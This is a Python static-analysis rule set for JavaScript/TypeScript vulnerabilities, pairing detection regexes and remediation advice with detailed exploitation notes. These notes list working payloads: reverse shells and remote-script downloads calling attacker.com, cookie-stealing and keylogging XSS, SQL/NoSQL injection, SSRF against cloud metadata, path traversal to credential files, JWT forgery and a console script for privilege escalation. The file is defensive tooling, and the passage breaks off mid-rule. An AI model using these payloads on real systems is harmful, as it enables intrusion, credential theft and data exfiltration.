"""
JavaScript/TypeScript security rules for static analysis.
"""

from dataclasses import dataclass
from enum import Enum
from typing import List, Optional
import re


class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"

    def __lt__(self, other):
        order = ["INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"]
        return order.index(self.value) < order.index(other.value)


@dataclass
class SecurityRule:
    id: str
    name: str
    pattern: str
    severity: Severity
    category: str
    cwe_id: str
    description: str
    exploitation: str
    remediation: str
    false_positive_hints: Optional[List[str]] = None

    def compile_pattern(self):
        return re.compile(self.pattern, re.IGNORECASE | re.MULTILINE)


# ============================================================================
# SECURITY RULES DATABASE
# ============================================================================

SECURITY_RULES: List[SecurityRule] = [
    # -------------------------------------------------------------------------
    # COMMAND INJECTION / RCE
    # -------------------------------------------------------------------------
    SecurityRule(
        id="CMD-001",
        name="Command Injection via child_process.exec",
        pattern=r"(child_process\s*[\.\[]\s*['\"]?exec['\"]?\s*\]?\s*\(|exec\s*\(\s*[`'\"].*\$\{|exec\s*\([^)]*\+)",
        severity=Severity.CRITICAL,
        category="Command Injection",
        cwe_id="CWE-78",
        description="Detected child_process.exec() with potential user input. This allows arbitrary command execution on the server.",
        exploitation="""
EXPLOITATION:
1. Identify the user-controlled input that flows into exec()
2. Inject shell metacharacters to break out of intended command:
   - Use '; command' to chain commands
   - Use '| command' to pipe output
   - Use '&& command' or '|| command' for conditional execution
   - Use '$(command)' or '`command`' for command substitution
   
EXAMPLE PAYLOADS:
   - ; cat /etc/passwd
   - | nc attacker.com 4444 -e /bin/sh
   - && curl http://attacker.com/shell.sh | sh
   - `whoami`
   
POC: If input is filename, try: test.txt; id""",
        remediation="Use execFile() or spawn() with array arguments instead. Never pass user input directly to shell commands."
    ),
    SecurityRule(
        id="CMD-002",
        name="Command Injection via execSync",
        pattern=r"execSync\s*\([^)]*(\+|\$\{|`)",
        severity=Severity.CRITICAL,
        category="Command Injection",
        cwe_id="CWE-78",
        description="Synchronous command execution with string concatenation detected.",
        exploitation="""
EXPLOITATION:
Same as CMD-001. execSync blocks the event loop, making timing-based detection easier.

ADDITIONAL TECHNIQUES:
- Time-based detection: '; sleep 10' to confirm execution
- DNS exfiltration: '; nslookup $(whoami).attacker.com'
- File write: '; echo pwned > /tmp/proof'""",
        remediation="Use spawnSync() with array arguments. Validate and sanitize all inputs."
    ),
    SecurityRule(
        id="CMD-003",
        name="Dangerous eval() Usage",
        pattern=r"\beval\s*\(\s*[^)]*(\+|`|\$\{|req\.|request\.|params\.|query\.|body\.)",
        severity=Severity.CRITICAL,
        category="Code Injection",
        cwe_id="CWE-94",
        description="eval() with dynamic input can execute arbitrary JavaScript code.",
        exploitation="""
EXPLOITATION:
1. Inject JavaScript code that will be evaluated
2. In Node.js, access require() to import modules:
   
PAYLOADS:
- require('child_process').execSync('id').toString()
- process.mainModule.require('child_process').execSync('whoami')
- this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')

FOR BROWSER:
- alert(document.domain)
- fetch('http://attacker.com/?c='+document.cookie)""",
        remediation="Never use eval() with user input. Use JSON.parse() for JSON data, or Function constructor with strict validation."
    ),
    SecurityRule(
        id="CMD-004",
        name="Function Constructor Code Injection",
        pattern=r"new\s+Function\s*\([^)]*(\+|`|\$\{|req\.|request\.|params\.|body\.)",
        severity=Severity.CRITICAL,
        category="Code Injection",
        cwe_id="CWE-94",
        description="Function constructor with dynamic input allows code injection similar to eval().",
        exploitation="""
EXPLOITATION:
The Function constructor creates a new function from a string.
Inject malicious code as the function body.

PAYLOADS:
- '); return process.mainModule.require('child_process').execSync('id');//
- '); require('fs').writeFileSync('/tmp/pwned','owned');//""",
        remediation="Avoid dynamic function creation. Use predefined functions or safe evaluation libraries."
    ),

    # -------------------------------------------------------------------------
    # SQL INJECTION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="SQL-001",
        name="SQL Injection via String Concatenation",
        pattern=r"(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE|ORDER BY|GROUP BY|UNION)\s+.*(\+\s*['\"]|\$\{|`[^`]*\$\{)",
        severity=Severity.CRITICAL,
        category="SQL Injection",
        cwe_id="CWE-89",
        description="SQL query built with string concatenation is vulnerable to SQL injection.",
        exploitation="""
EXPLOITATION:
1. Identify the injection point in the SQL query
2. Determine if it's string, numeric, or within ORDER BY clause

PAYLOADS FOR STRING CONTEXT:
- ' OR '1'='1' --
- ' UNION SELECT NULL,username,password FROM users --
- '; DROP TABLE users; --

PAYLOADS FOR NUMERIC CONTEXT:
- 1 OR 1=1
- 1 UNION SELECT NULL,NULL,@@version

TIME-BASED BLIND:
- ' OR SLEEP(5) --
- '; WAITFOR DELAY '0:0:5' --

OUT-OF-BAND:
- '; SELECT load_file(concat('\\\\\\\\',@@version,'.attacker.com\\\\a'))--""",
        remediation="Use parameterized queries or prepared statements. Never concatenate user input into SQL."
    ),
    SecurityRule(
        id="SQL-002",
        name="Raw SQL Query Execution",
        pattern=r"\.(query|execute|raw|sequelize\.query)\s*\(\s*[`'\"].*(\$\{|\+\s*[a-zA-Z])",
        severity=Severity.HIGH,
        category="SQL Injection",
        cwe_id="CWE-89",
        description="Raw SQL query with dynamic values detected in ORM context.",
        exploitation="""
EXPLOITATION:
Even within ORMs, raw queries bypass parameterization.

1. Test for SQL injection with standard payloads
2. Use ORM-specific escape bypasses if present

DETECTION:
- Add ' to input and check for SQL errors
- Use time-based payloads to confirm blind SQLi""",
        remediation="Use ORM's built-in parameterization: sequelize.query(sql, { replacements: { id: userInput } })"
    ),

    # -------------------------------------------------------------------------
    # NOSQL INJECTION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="NOSQL-001",
        name="NoSQL Injection in MongoDB Query",
        pattern=r"\.(find|findOne|findOneAndUpdate|updateOne|updateMany|deleteOne|deleteMany|aggregate)\s*\(\s*\{[^}]*(\$where|\$regex|\$ne|\$gt|\$lt|\$gte|\$lte)[^}]*\}",
        severity=Severity.HIGH,
        category="NoSQL Injection",
        cwe_id="CWE-943",
        description="MongoDB query with operators that may allow NoSQL injection.",
        exploitation="""
EXPLOITATION:
1. If user input goes into query object, inject MongoDB operators

PAYLOADS:
- {"username": {"$ne": ""}} - Returns all users
- {"username": {"$regex": ".*"}} - Regex injection
- {"$where": "this.password.match(/.*/)"}
- {"username": {"$gt": ""}, "password": {"$gt": ""}}

FOR AUTH BYPASS:
POST /login
{"username": {"$ne": ""}, "password": {"$ne": ""}}

POC: Change input from "admin" to {"$ne": ""}""",
        remediation="Validate input types strictly. Use mongoose schema validation. Sanitize using mongo-sanitize library."
    ),
    SecurityRule(
        id="NOSQL-002",
        name="MongoDB $where Clause Injection",
        pattern=r"\$where\s*:\s*[`'\"].*(\+|\$\{)",
        severity=Severity.CRITICAL,
        category="NoSQL Injection",
        cwe_id="CWE-943",
        description="$where clause executes JavaScript and is vulnerable to injection.",
        exploitation="""
EXPLOITATION:
$where executes JavaScript server-side in MongoDB.

PAYLOADS:
- "1==1" or "this.password.match(/.*/)//
- "sleep(5000)" for time-based detection
- "this.constructor.constructor('return this')().process" (sandboxed, may not work)

TIME-BASED BLIND:
- "sleep(5000) || true"
- "new Date().getTime() > 0 && sleep(5000)"

DATA EXTRACTION (char by char):
- "this.password[0] == 'a'"
- Iterate to extract sensitive fields""",
        remediation="Never use $where. Use standard query operators or aggregation pipeline instead."
    ),

    # -------------------------------------------------------------------------
    # XSS (CROSS-SITE SCRIPTING)
    # -------------------------------------------------------------------------
    SecurityRule(
        id="XSS-001",
        name="DOM XSS via innerHTML",
        pattern=r"\.innerHTML\s*=\s*[^;]*(\+|`|\$\{|req\.|request\.|params\.|query\.|location\.|document\.)",
        severity=Severity.HIGH,
        category="Cross-Site Scripting",
        cwe_id="CWE-79",
        description="innerHTML assignment with dynamic content enables DOM-based XSS.",
        exploitation="""
EXPLOITATION:
1. Inject HTML/JavaScript through the user-controlled source

PAYLOADS:
- <img src=x onerror=alert(document.domain)>
- <svg onload=alert(1)>
- <iframe srcdoc="<script>alert(1)</script>">
- <body onpageshow=alert(1)>

COOKIE THEFT:
- <img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">

KEYLOGGER:
- <script>document.onkeypress=function(e){fetch('http://attacker.com/?k='+e.key)}</script>""",
        remediation="Use textContent for text, or sanitize with DOMPurify before innerHTML."
    ),
    SecurityRule(
        id="XSS-002",
        name="DOM XSS via document.write",
        pattern=r"document\.write(ln)?\s*\([^)]*(\+|`|\$\{|location\.|document\.|window\.)",
        severity=Severity.HIGH,
        category="Cross-Site Scripting",
        cwe_id="CWE-79",
        description="document.write() with dynamic content is vulnerable to XSS.",
        exploitation="""
EXPLOITATION:
Same as XSS-001. document.write interprets HTML directly.

ADDITIONAL:
- </script><script>alert(1)</script> (script context breakout)
- If in attribute: " onmouseover="alert(1)""",
        remediation="Avoid document.write(). Use DOM manipulation methods with textContent."
    ),
    SecurityRule(
        id="XSS-003",
        name="React dangerouslySetInnerHTML",
        pattern=r"dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*[^}]*(\+|`|\$\{|props\.|state\.|params)",
        severity=Severity.HIGH,
        category="Cross-Site Scripting",
        cwe_id="CWE-79",
        description="dangerouslySetInnerHTML with unsanitized input enables XSS in React.",
        exploitation="""
EXPLOITATION:
React normally escapes content, but dangerouslySetInnerHTML bypasses this.

1. Find where the __html value comes from
2. Inject HTML payloads through that source

PAYLOADS: Same as XSS-001""",
        remediation="Sanitize with DOMPurify: dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}}"
    ),
    SecurityRule(
        id="XSS-004",
        name="URL-based XSS via location manipulation",
        pattern=r"(location\.(href|hash|search|pathname)|window\.location)\s*=\s*[^;]*(\+|`|\$\{|decodeURI|unescape)",
        severity=Severity.MEDIUM,
        category="Cross-Site Scripting",
        cwe_id="CWE-79",
        description="Location manipulation with unsanitized input can lead to XSS via javascript: URLs.",
        exploitation="""
EXPLOITATION:
Inject javascript: protocol URL

PAYLOADS:
- javascript:alert(document.domain)
- javascript:fetch('http://attacker.com/?c='+document.cookie)

URL ENCODED:
- javascript:alert%281%29

DATA URL (sometimes blocked):
- data:text/html,<script>alert(1)</script>""",
        remediation="Validate URLs against allowlist. Check protocol is http/https only."
    ),

    # -------------------------------------------------------------------------
    # PATH TRAVERSAL
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PATH-001",
        name="Path Traversal in File Operations",
        pattern=r"(readFile|writeFile|readFileSync|writeFileSync|createReadStream|createWriteStream|unlink|rmdir|mkdir|access|stat)\s*\([^)]*(\+|`|\$\{|req\.|request\.|params\.|query\.|body\.)",
        severity=Severity.HIGH,
        category="Path Traversal",
        cwe_id="CWE-22",
        description="File system operation with user input allows reading/writing arbitrary files.",
        exploitation="""
EXPLOITATION:
1. Use ../ sequences to traverse directories

PAYLOADS:
- ../../../etc/passwd
- ..\\..\\..\\windows\\system32\\config\\sam
- ....//....//....//etc/passwd (bypass some filters)
- ..%252f..%252f..%252fetc/passwd (double encoding)
- /etc/passwd%00.png (null byte, older systems)

HIGH-VALUE TARGETS:
Linux:
- /etc/passwd, /etc/shadow
- /root/.ssh/id_rsa
- /proc/self/environ
- ~/.bash_history

Windows:
- C:\\Windows\\System32\\config\\SAM
- C:\\Users\\Administrator\\.ssh\\id_rsa

Node.js specific:
- ../../package.json
- ../../.env
- ../../node_modules/<pkg>/package.json""",
        remediation="Use path.resolve() and validate the final path is within allowed directory. Use path.basename() for filenames."
    ),
    SecurityRule(
        id="PATH-002",
        name="Path Traversal via path.join",
        pattern=r"path\.join\s*\([^)]*,\s*[^)]*(\+|`|\$\{|req\.|request\.|params\.|query\.|body\.)",
        severity=Severity.MEDIUM,
        category="Path Traversal",
        cwe_id="CWE-22",
        description="path.join with user input can still allow traversal as it resolves '..' sequences.",
        exploitation="""
EXPLOITATION:
path.join does NOT prevent traversal - it resolves paths including ../

path.join('/base', '../../../etc/passwd') = '/etc/passwd'

PAYLOADS: Same as PATH-001""",
        remediation="After path.join, verify result starts with expected base directory."
    ),

    # -------------------------------------------------------------------------
    # SERVER-SIDE REQUEST FORGERY (SSRF)
    # -------------------------------------------------------------------------
    SecurityRule(
        id="SSRF-001",
        name="SSRF via HTTP Request Libraries",
        pattern=r"(axios|fetch|request|got|superagent|http\.get|https\.get|urllib)\s*[\.\(][^)]*(\+|`|\$\{|req\.|request\.|params\.|query\.|body\.)",
        severity=Severity.HIGH,
        category="Server-Side Request Forgery",
        cwe_id="CWE-918",
        description="HTTP request with user-controlled URL can access internal services.",
        exploitation="""
EXPLOITATION:
1. Target internal services not accessible from outside

PAYLOADS:
Cloud metadata (CRITICAL):
- http://169.254.169.254/latest/meta-data/iam/security-credentials/
- http://metadata.google.internal/computeMetadata/v1/
- http://169.254.169.254/metadata/instance?api-version=2021-02-01

Internal services:
- http://localhost:6379/ (Redis)
- http://127.0.0.1:9200/_cat/indices (Elasticsearch)
- http://internal-api.corp.local/admin

Protocol smuggling:
- gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
- file:///etc/passwd
- dict://localhost:6379/info

DNS rebinding:
- Use rebind.network or similar for bypass

BYPASS TECHNIQUES:
- http://127.1/ (shortened localhost)
- http://0.0.0.0/
- http://[::1]/ (IPv6 localhost)
- http://localhost.attacker.com/ (DNS points to 127.0.0.1)
- http://0x7f000001/ (hex IP)
- http://2130706433/ (decimal IP)""",
        remediation="Validate URLs against allowlist. Block private IP ranges. Disable redirects or validate each redirect."
    ),

    # -------------------------------------------------------------------------
    # AUTHENTICATION / AUTHORIZATION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="AUTH-001",
        name="Hardcoded JWT Secret",
        pattern=r"(jwt\.sign|jwt\.verify|jsonwebtoken)\s*\([^)]*['\"`](secret|password|key|123|abc|test|admin)['\"`]",
        severity=Severity.CRITICAL,
        category="Authentication",
        cwe_id="CWE-798",
        description="Hardcoded JWT secret allows token forgery.",
        exploitation="""
EXPLOITATION:
1. Use the discovered secret to forge JWT tokens
2. Create admin tokens or modify claims

STEPS:
1. Decode existing JWT at jwt.io
2. Modify payload (e.g., {"role": "admin", "userId": 1})
3. Sign with discovered secret

TOOLS:
- jwt_tool: python3 jwt_tool.py <token> -S hs256 -p 'discovered_secret' -I -pc role -pv admin
- Manual: Use jsonwebtoken library to sign new token

POC CODE:
const jwt = require('jsonwebtoken');
const token = jwt.sign({userId: 1, role: 'admin'}, 'discovered_secret');""",
        remediation="Use environment variables for secrets. Use strong, random secrets (32+ bytes). Rotate secrets regularly."
    ),
    SecurityRule(
        id="AUTH-002",
        name="JWT None Algorithm Vulnerability",
        pattern=r"(algorithms?\s*:\s*\[\s*['\"]none['\"]|verify\s*:\s*false|algorithm\s*=\s*['\"]none['\"])",
        severity=Severity.CRITICAL,
        category="Authentication",
        cwe_id="CWE-345",
        description="JWT configured to accept 'none' algorithm allows unsigned tokens.",
        exploitation="""
EXPLOITATION:
1. Create a JWT with algorithm 'none' and no signature
2. Server will accept it without verification

MANUAL FORGE:
1. Header: {"alg": "none", "typ": "JWT"} -> base64url encode
2. Payload: {"sub": "admin", "role": "admin"} -> base64url encode
3. Token: header.payload. (note: empty signature, trailing dot)

TOOL:
jwt_tool.py <token> -X a (algorithm none attack)

POC:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.""",
        remediation="Explicitly specify allowed algorithms: jwt.verify(token, secret, {algorithms: ['HS256']})"
    ),
    SecurityRule(
        id="AUTH-003",
        name="Hardcoded Credentials",
        pattern=r"(password|passwd|pwd|secret|api_?key|apikey|auth_?token|access_?token|private_?key)\s*[=:]\s*['\"][^'\"]{4,}['\"]",
        severity=Severity.HIGH,
        category="Information Disclosure",
        cwe_id="CWE-798",
        description="Hardcoded credentials found in source code.",
        exploitation="""
EXPLOITATION:
1. Extract the credential value
2. Identify the service it belongs to (API endpoint, database, etc.)
3. Use the credential to authenticate

COMMON TARGETS:
- Database connection strings
- API keys for third-party services
- Admin passwords
- OAuth client secrets

STEPS:
1. Search for related endpoints or configurations
2. Test credential against login endpoints
3. Check if credential works on other environments (staging, prod)""",
        remediation="Use environment variables or secret management (AWS Secrets Manager, HashiCorp Vault).",
        false_positive_hints=["placeholder", "example", "test", "dummy", "xxx", "changeme", "your_"]
    ),
    SecurityRule(
        id="AUTH-004",
        name="Disabled Authentication Check",
        pattern=r"(isAuthenticated|isAuthorized|checkAuth|requireAuth|verifyToken)\s*[=:]\s*(false|\(\s*\)\s*=>\s*(true|false)|function\s*\(\s*\)\s*\{\s*return\s*(true|false))",
        severity=Severity.CRITICAL,
        category="Authentication Bypass",
        cwe_id="CWE-287",
        description="Authentication check appears to be disabled or hardcoded.",
        exploitation="""
EXPLOITATION:
If authentication is disabled, directly access protected endpoints.

STEPS:
1. Identify which routes use this disabled check
2. Access those routes without authentication
3. Look for admin/privileged functionality

POC:
curl http://target.com/api/admin/users (no auth header)""",
        remediation="Never disable authentication checks. Use proper middleware and test thoroughly."
    ),
    SecurityRule(
        id="AUTH-005",
        name="Backdoor URL Parameter in Authorization",
        pattern=r"(urlParams|searchParams|URLSearchParams|queryString|query|location\.search|location\.href|window\.location).*\.(has|get|includes)\s*\(\s*['\"][^'\"]+['\"].*\).*\b(admin|auth|isAdmin|role|privilege|access|permission|bypass|debug|test|dev|internal|secret|hidden|backdoor|master|super|root|god|king|queen|override|skip|disable)",
        severity=Severity.CRITICAL,
        category="Privilege Escalation",
        cwe_id="CWE-284",
        description="Authorization logic depends on URL parameter - likely a backdoor or debug feature left in production code.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PRIVILEGE ESCALATION VIA BACKDOOR URL PARAMETER                             ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY ANALYSIS:
The authorization check requires a specific URL parameter to be present.
This is a classic backdoor pattern often left by developers for testing.

EXPLOITATION STEPS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. IDENTIFY THE BACKDOOR PARAMETER:
   Look for parameter names in the code (e.g., 'debug', 'admin', 'test', etc.)
   
2. ADD PARAMETER TO ANY REQUEST:
   https://target.com/dashboard?kingcharles=1
   https://target.com/api/users?debug=true
   https://target.com/admin?bypass=anything

3. TEST DIFFERENT VALUES:
   ?param=true
   ?param=1
   ?param=yes
   ?param=               (empty value, just presence matters)
   ?param                (no value at all if using .has())

PAYLOAD EXAMPLES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# If backdoor enables admin access:
curl 'https://target.com/admin/users?backdoor_param=1' -H 'Cookie: session=YOUR_SESSION'

# If backdoor bypasses authentication:
curl 'https://target.com/api/admin/delete-user?debug=true' -X DELETE -d '{"userId": 1}'

# Combine with other vulnerabilities:
curl 'https://target.com/admin?backdoor=1&userId=1' -X PUT -d '{"role": "admin"}'

BROWSER TESTING:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Login as low-privilege user
2. Navigate to restricted page
3. Add backdoor parameter to URL
4. Check if admin features appear

COMMON BACKDOOR PARAMETER NAMES TO FUZZ:
debug, test, dev, admin, bypass, internal, secret, override, master, god, 
superuser, root, hidden, backdoor, skip_auth, no_auth, disable_check,
kingcharles, letmein, opensesame, testing, staging, qa""",
        remediation="Remove all debug/backdoor parameters. Never use URL parameters for authorization decisions. Use proper RBAC with server-side validation."
    ),
    SecurityRule(
        id="AUTH-006",
        name="Insecure String Matching for Authorization",
        pattern=r"\.(includes|indexOf|search|match|startsWith|endsWith)\s*\([^)]*\).*\b(admin|email|user|role|permission|domain|allowed|whitelist|auth)",
        severity=Severity.HIGH,
        category="Privilege Escalation",
        cwe_id="CWE-285",
        description="Authorization uses partial string matching (includes/indexOf) instead of exact comparison, allowing bypass via crafted input.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PRIVILEGE ESCALATION VIA INSECURE STRING MATCHING                           ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY ANALYSIS:
Code uses .includes(), .indexOf(), .startsWith(), etc. for authorization.
These methods check for SUBSTRINGS, not exact matches!

EXAMPLE VULNERABLE CODE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// If admin emails are ['admin@company.com']
if (userEmail.includes(adminEmail)) { grantAdmin(); }

// BYPASS: Register as admin@company.com.attacker.com
// The string 'admin@company.com' IS INCLUDED in 'admin@company.com.attacker.com'

EXPLOITATION TECHNIQUES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. EMAIL DOMAIN SPOOFING:
   Allowed: admin@company.com
   Bypass:  admin@company.com.evil.com
   Bypass:  admin@company.com@attacker.com
   Bypass:  anything+admin@company.com@evil.com

2. SUBDOMAIN INCLUSION:
   Allowed: company.com
   Bypass:  company.com.attacker.com
   Bypass:  attacker-company.com (if using includes)

3. PREFIX/SUFFIX ATTACKS:
   Allowed: "admin"
   Bypass:  "notadmin" (contains 'admin')
   Bypass:  "administrator" (starts with 'admin')

4. CASE MANIPULATION (if .toLowerCase() missing):
   Allowed: ADMIN@company.com
   Bypass:  admin@company.com (different case)

PAYLOAD EXAMPLES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Register account with spoofed email
curl -X POST https://target.com/api/register \\
  -H 'Content-Type: application/json' \\
  -d '{"email": "admin@company.com.attacker.com", "password": "test123"}'

# Update profile email to spoofed version
curl -X PUT https://target.com/api/profile \\
  -H 'Authorization: Bearer YOUR_TOKEN' \\
  -d '{"email": "victim@allowed-domain.com.mysite.com"}'

# Verify admin access
curl https://target.com/api/admin/dashboard \\
  -H 'Authorization: Bearer YOUR_NEW_TOKEN'

STEP-BY-STEP EXPLOITATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Identify what strings are being matched (admin emails, domains, etc.)
2. Register/create account with email containing allowed string as substring
3. Example: If 'admin@corp.com' is allowed, use 'admin@corp.com.yourdomain.com'
4. Verify email (you control the domain so you receive the verification)
5. Login and check if you now have elevated privileges""",
        remediation="Use exact string comparison (===) or proper email validation. For email matching, parse the email and compare domain exactly: email.split('@')[1] === allowedDomain"
    ),
    SecurityRule(
        id="AUTH-007",
        name="Client-Side Authorization Check",
        pattern=r"(isAdmin|isAuthorized|hasPermission|canAccess|checkRole|userRole|isAllowed|hasAccess|isModerator|isSuper)\s*[=:]\s*[^;]*\b(localStorage|sessionStorage|window\.|document\.|cookie|urlParams|searchParams|location\.|JSON\.parse)",
        severity=Severity.HIGH,
        category="Privilege Escalation",
        cwe_id="CWE-602",
        description="Authorization decision made client-side based on manipulable data (localStorage, cookies, URL params).",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PRIVILEGE ESCALATION VIA CLIENT-SIDE AUTHORIZATION BYPASS                   ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY ANALYSIS:
The application checks user privileges on the client side using data that
users can modify (localStorage, sessionStorage, cookies, URL parameters).

EXPLOITATION STEPS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. LOCALSTORAGE/SESSIONSTORAGE MANIPULATION:

   Open Browser DevTools (F12) > Console:
   
   // Check current values
   localStorage.getItem('user')
   localStorage.getItem('role')
   localStorage.getItem('isAdmin')
   
   // Modify to gain admin
   localStorage.setItem('isAdmin', 'true')
   localStorage.setItem('role', 'admin')
   localStorage.setItem('user', JSON.stringify({...JSON.parse(localStorage.getItem('user')), role: 'admin', isAdmin: true}))
   
   // Reload page
   location.reload()

2. COOKIE MANIPULATION:

   // In DevTools Console:
   document.cookie = "isAdmin=true; path=/"
   document.cookie = "role=admin; path=/"
   document.cookie = "userRole=administrator; path=/"
   
   // Or use browser DevTools > Application > Cookies

3. JWT TOKEN MANIPULATION (if stored client-side):

   // Decode token
   const token = localStorage.getItem('token')
   const payload = JSON.parse(atob(token.split('.')[1]))
   
   // Check claims
   console.log(payload)  // Look for role, admin, permissions fields
   
   // Modify (won't work if properly verified server-side)
   // But try anyway - some apps only check client-side!

AUTOMATED PAYLOAD - BROWSER CONSOLE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// One-liner privilege escalation attempt
['isAdmin','admin','role','userRole','permissions','accessLevel'].forEach(k => {
  localStorage.setItem(k, 'true');
  localStorage.setItem(k, 'admin');
  sessionStorage.setItem(k, 'true');
  sessionStorage.setItem(k, 'admin');
});
Object.keys(localStorage).filter(k => k.includes('user')).forEach(k => {
  try {
    let u = JSON.parse(localStorage.getItem(k));
    u.isAdmin = true; u.role = 'admin'; u.admin = true;
    localStorage.setItem(k, JSON.stringify(u));
  } catch(e) {}
});
location.reload();

VERIFICATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
After modification, check if:
1. Admin UI elements appear
2. New menu items become visible
3. API calls to admin endpoints succeed
4. You can access /admin, /dashboard, /manage routes""",
        remediation="NEVER trust client-side authorization. Always verify permissions server-side for every protected action. Client-side checks should only be for UX, not security."
    ),
    SecurityRule(
        id="AUTH-008",
        name="Hidden Debug/Admin URL Parameter",
        pattern=r"(urlParams|searchParams|URLSearchParams|query|location\.search)\s*\.\s*(has|get)\s*\(\s*['\"](debug|test|dev|admin|staging|internal|bypass|override|god|master|secret|hidden|qa|preview|beta|canary|sudo|root|superuser|backdoor|letmein)['\"]",
        severity=Severity.CRITICAL,
        category="Privilege Escalation",
        cwe_id="CWE-912",
        description="Code checks for hidden debug/admin URL parameter that likely enables privileged functionality.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  BACKDOOR DETECTION - HIDDEN DEBUG/ADMIN PARAMETER                           ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY ANALYSIS:
Developer left a debug/test URL parameter that enables hidden functionality.
This is essentially a backdoor into the application.

IMMEDIATE EXPLOITATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Try adding the discovered parameter to ANY page:

https://target.com/?debug=1
https://target.com/?debug=true
https://target.com/?test=1
https://target.com/login?admin=true
https://target.com/dashboard?internal=1
https://target.com/api/users?bypass=true

PARAMETER VALUE FUZZING:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# If .has() is used - any value works:
?debug
?debug=
?debug=anything

# If .get() is used with boolean check:
?debug=true
?debug=1
?debug=yes

# If .get() is used with specific value:
?debug=DEBUG_SECRET_KEY
?admin=ADMIN_PASSWORD

CURL TESTING:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Test unauthenticated
curl -v 'https://target.com/admin?debug=true'

# Test with session
curl -v 'https://target.com/admin/users?debug=true' \\
  -H 'Cookie: session=YOUR_SESSION_COOKIE'

# Test API endpoints
curl 'https://target.com/api/v1/admin/settings?internal=1' \\
  -H 'Authorization: Bearer YOUR_TOKEN'

COMMON BEHAVIORS WHEN BACKDOOR IS ACTIVE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Bypasses authentication entirely
• Enables admin/debug mode
• Shows verbose error messages
• Exposes internal API endpoints
• Disables rate limiting
• Skips authorization checks
• Enables hidden features
• Shows raw database queries""",
        remediation="Remove ALL debug parameters from production code. Use environment-based feature flags that cannot be controlled via user input."
    ),
    SecurityRule(
        id="AUTH-009",
        name="Weak Role/Permission Check Logic",
        pattern=r"(role|userRole|permission|access|privilege)\s*[!=]==?\s*['\"]?(admin|user|guest|moderator|editor)['\"]?\s*\|\|",
        severity=Severity.MEDIUM,
        category="Privilege Escalation",
        cwe_id="CWE-285",
        description="Role check uses OR logic which may allow bypasses if any condition is true.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  WEAK ROLE CHECK LOGIC BYPASS                                                ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY ANALYSIS:
Authorization uses OR (||) logic, meaning if ANY condition is true, access is granted.
This can lead to unintended access if other conditions are controllable.

EXAMPLE VULNERABLE PATTERNS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// Pattern 1: Role OR debug param
if (user.role === 'admin' || debugMode) { /* admin access */ }

// Pattern 2: Role OR feature flag
if (user.role === 'admin' || featureFlags.newAdminPanel) { /* access */ }

// Pattern 3: Multiple role checks poorly ordered
